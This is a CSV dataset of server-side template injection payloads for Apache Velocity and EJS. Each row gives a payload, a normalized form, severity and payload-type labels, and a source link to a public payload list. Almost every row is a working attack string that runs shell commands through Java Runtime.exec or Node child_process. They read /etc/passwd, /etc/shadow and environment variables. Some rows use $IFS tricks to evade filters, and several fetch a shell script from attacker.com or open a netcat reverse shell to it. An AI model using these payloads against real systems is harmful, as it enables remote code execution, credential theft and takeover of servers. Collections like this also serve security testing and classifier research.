#set($ex=$rt.getRuntime().exec('id')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('whoami')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat /etc/passwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('ls -la')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('uname -a')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('pwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('env')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat flag.txt')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($pb=$class.inspect(""java.lang.ProcessBuilder"").type)","#set($pb=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""id""])","#set($arr=[""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($process=$pb.newInstance($arr).start()),#set($process=$pb.newinstance($arr).start()),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""whoami""])","#set($arr=[""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""cat"",""/etc/passwd""])","#set($arr=[""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""ls"",""-la""])","#set($arr=[""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""uname"",""-a""])","#set($arr=[""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""bash"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""sh"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""/bin/sh"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""/bin/bash"",""-c"",""id""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($file=$class.inspect(""java.io.File"").type)","#set($file=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($obj=$file.newInstance(""/etc/passwd""))","#set($obj=$file.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($obj=$file.newInstance(""/""))","#set($obj=$file.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($obj=$file.newInstance("".""))","#set($obj=$file.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scanner=$class.inspect(""java.util.Scanner"").type)","#set($scanner=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fileObj=$file.newInstance(""/etc/passwd""))","#set($fileobj=$file.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scannerObj=$scanner.newInstance($fileObj).useDelimiter(""\\Z""))","#set($scannerobj=$scanner.newinstance($fileobj).usedelimiter(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fileObj=$file.newInstance(""flag.txt""))","#set($fileobj=$file.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""touch /tmp/pwned""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""wget http://attacker.com/shell.sh -O /tmp/shell.sh""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""curl http://attacker.com/shell.sh -o /tmp/shell.sh""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""nc attacker.com 4444 -e /bin/bash""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat${IFS}/etc/passwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($ex=$rt.getRuntime().exec('cat$IFS/etc/passwd')),#set($ex=$rt.getruntime().exec('S')),java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""sh"",""-c"",""cat</etc/passwd""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""sh"",""-c"",""cat<flag.txt""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""calc""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cmd /c calc""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cmd /c dir""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""powershell.exe""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($process=$runtime.getRuntime().exec(""cmd.exe /c whoami""))","#set($process=$runtime.getruntime().exec(""S""))",java,Velocity,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""cmd"",""/c"",""whoami""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($arr=[""powershell"",""-c"",""whoami""])","#set($arr=[""S"",""S"",""S""])",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($input=$process.getInputStream()),#set($input=$process.getinputstream()),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scannerObj=$scanner.newInstance($input).useDelimiter(""\\A""))","#set($scannerobj=$scanner.newinstance($input).usedelimiter(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($scannerObj=$scanner.newInstance($input).useDelimiter(""\\Z""))","#set($scannerobj=$scanner.newinstance($input).usedelimiter(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($inetAddress=$class.inspect(""java.net.InetAddress"").type)","#set($inetaddress=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($thread=$class.inspect(""java.lang.Thread"").type)","#set($thread=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($bufferedReader=$class.inspect(""java.io.BufferedReader"").type)","#set($bufferedreader=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fileReader=$class.inspect(""java.io.FileReader"").type)","#set($filereader=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fr=$fileReader.newInstance(""/etc/passwd""))","#set($fr=$filereader.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($br=$bufferedReader.newInstance($fr)),#set($br=$bufferedreader.newinstance($fr)),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($fr=$fileReader.newInstance(""flag.txt""))","#set($fr=$filereader.newinstance(""S""))",java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
"#set($inputStreamReader=$class.inspect(""java.io.InputStreamReader"").type)","#set($inputstreamreader=$class.inspect(""S"").type)",java,Velocity,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($isr=$inputStreamReader.newInstance($process.getInputStream())),#set($isr=$inputstreamreader.newinstance($process.getinputstream())),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($br=$bufferedReader.newInstance($isr)),#set($br=$bufferedreader.newinstance($isr)),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#foreach($i in [1..$out.available()])$out.write($i)#end,#foreach($iin[N..$out.available()])$out.write($i)#end,java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($x=$context.get('out')),#set($x=$context.get('S')),java,Velocity,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
#set($x=$context.get('request')),#set($x=$context.get('S')),java,Velocity,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/velocity.txt
<%= global %>,<%=global%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process %>,<%=process%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process %>,<%=global.process%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule %>,<%=process.mainmodule%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require %>,<%=process.mainmodule.require%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process') %>,<%=process.mainmodule.require('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('id') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('whoami') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('cat /etc/passwd') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('ls -la') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('uname -a') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('pwd') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('env') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('cat flag.txt') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('ps aux') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('ifconfig') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('netstat -an') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').exec('cat /etc/shadow') %>,<%=process.mainmodule.require('S').exec('S')%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('id').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('whoami').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('ls -la').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('uname -a').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('pwd').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('env').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat flag.txt').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('ps aux').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('ifconfig').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('netstat -an').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cat /etc/shadow').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('id').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('whoami').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('uname',['-a']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('pwd').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').spawnSync('env').stdout.toString() %>,<%=process.mainmodule.require('S').spawnsync('S').stdout.tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('cat',['flag.txt']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('ls -la').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= global.process.mainModule.require('child_process').execSync('uname -a').toString() %>,<%=global.process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
